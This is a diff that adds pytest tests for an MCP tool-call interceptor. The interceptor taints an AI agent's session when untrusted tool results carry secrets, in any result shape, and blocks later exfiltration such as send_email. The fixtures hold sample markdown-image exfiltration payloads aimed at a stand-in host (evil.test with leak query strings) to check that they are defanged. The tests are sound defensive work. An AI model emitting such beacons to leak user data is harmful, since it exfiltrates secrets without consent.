@@ -150,3 +150,119 @@ def test_safe_tool_passes_through_when_tainted():
     _call(interceptor, 2, "fetch_url", {"url": "https://evil.test"})
     resp = _call(interceptor, 3, "search_docs", {"query": "anything"})
     assert resp["result"]["isError"] is False
+
+
+# --- every MCP result shape must be labelled, not just content[].text -------
+# The MCP spec (2025-06-18) allows a tools/call result to carry data in
+# structuredContent, and in content blocks of type text / image / audio /
+# resource / resource_link. Extracting only {"type": "text"} meant every other
+# shape reached the agent with no label, no taint and no ledger entry -- an
+# ingestion gap no strictness setting can compensate for.
+
+class ShapeUpstream:
+    """Upstream that returns one caller-supplied ``result`` object verbatim."""
+
+    def __init__(self, result: dict):
+        self.result = result
+        self.calls: list[tuple[str, dict]] = []
+
+    def __call__(self, message: dict) -> dict:
+        method = message.get("method")
+        id_ = message.get("id")
+        if method == "tools/list":
+            return {"jsonrpc": "2.0", "id": id_, "result": {"tools": TOOLS}}
+        if method == "tools/call":
+            params = message.get("params") or {}
+            self.calls.append((params.get("name"), params.get("arguments", {})))
+            if params.get("name") == "fetch_url":
+                return {"jsonrpc": "2.0", "id": id_, "result": self.result}
+            return {
+                "jsonrpc": "2.0",
+                "id": id_,
+                "result": {"content": [{"type": "text", "text": "ok"}]},
+            }
+        return {"jsonrpc": "2.0", "id": id_, "result": {}}
+
+
+SECRET = "SENTINEL-Zx9-4471"
+
+
+def _shape_setup(result, strictness=Strictness.BALANCED):
+    upstream = ShapeUpstream(result)
+    session = Session(policy=PolicyEngine(strictness=strictness))
+    interceptor = MCPInterceptor(session, upstream, hitl=None)
+    interceptor.handle_request({"jsonrpc": "2.0", "id": 1, "method": "tools/list"})
+    return interceptor, upstream, session
+
+
+import pytest
+
+
+@pytest.mark.parametrize(
+    "label,result",
+    [
+        ("structuredContent", {"content": [], "structuredContent": {"note": f"leak {SECRET}"}}),
+        ("bare string content", {"content": f"leak {SECRET}"}),
+        ("embedded resource", {"content": [
+            {"type": "resource",
+             "resource": {"uri": "file:///a", "mimeType": "text/plain",
+                          "text": f"leak {SECRET}"}}]}),
+        ("resource_link", {"content": [
+            {"type": "resource_link", "uri": "file:///a", "name": "a",
+             "description": f"leak {SECRET}"}]}),
+        ("image mimeType", {"content": [
+            {"type": "image", "data": "aGk=", "mimeType": "image/png",
+             "annotations": {"note": f"leak {SECRET}"}}]}),
+    ],
+)
+def test_every_result_shape_taints_the_session(label, result):
+    """A secret arriving in any spec-legal shape must become tracked taint."""
+    interceptor, _, session = _shape_setup(result)
+    _call(interceptor, 2, "fetch_url", {"url": "https://feed.test"})
+    assert session.is_tainted, f"{label}: session not tainted"
+    # ...and the exfiltration of that secret is then blocked.
+    resp = _call(interceptor, 3, "send_email",
+                 {"to": "a@b.test", "subject": "x", "body": SECRET})
+    assert resp["result"]["isError"] is True, f"{label}: exfiltration allowed"
+
+
+def test_paranoid_does_not_close_the_structured_content_gap():
+    """It is an *ingestion* gap: paranoid cannot taint on data it never saw."""
+    interceptor, _, session = _shape_setup(
+        {"content": [], "structuredContent": {"note": "anything at all"}},
+        strictness=Strictness.PARANOID,
+    )
+    _call(interceptor, 2, "fetch_url", {"url": "https://feed.test"})
+    assert session.is_tainted
+
+
+def test_every_text_block_is_sanitized_not_just_the_first():
+    """Concatenating N blocks and writing the result into block 0 left the
+    later blocks carrying the original un-defanged URL."""
+    interceptor, _, _ = _shape_setup({"content": [
+        {"type": "text", "text": "first ![](https://evil.test/a?leak=1)"},
+        {"type": "text", "text": "second ![](https://evil.test/b?leak=2)"},
+    ]})
+    resp = _call(interceptor, 2, "fetch_url", {"url": "https://feed.test"})
+    blocks = resp["result"]["content"]
+    assert "evil.test" not in blocks[0]["text"]
+    assert "evil.test" not in blocks[1]["text"]
+
+
+def test_structured_content_is_sanitized_in_place():
+    interceptor, _, _ = _shape_setup(
+        {"content": [], "structuredContent": {"body": "![](https://evil.test/p?leak=S)"}}
+    )
+    resp = _call(interceptor, 2, "fetch_url", {"url": "https://feed.test"})
+    assert "evil.test" not in str(resp["result"]["structuredContent"])
+
+
+def test_binary_payload_is_passed_through_untouched():
+    """Sanitizing must not corrupt base64 image data, and the blob must not
+    become a tracked token."""
+    blob = "iVBORw0KGgoAAAANSUhEUg" * 200
+    interceptor, _, session = _shape_setup({"content": [
+        {"type": "image", "data": blob, "mimeType": "image/png"}]})
+    resp = _call(interceptor, 2, "fetch_url", {"url": "https://feed.test"})
+    assert resp["result"]["content"][0]["data"] == blob
+    assert not any(len(t) > 1000 for t in session._tainted_tokens)
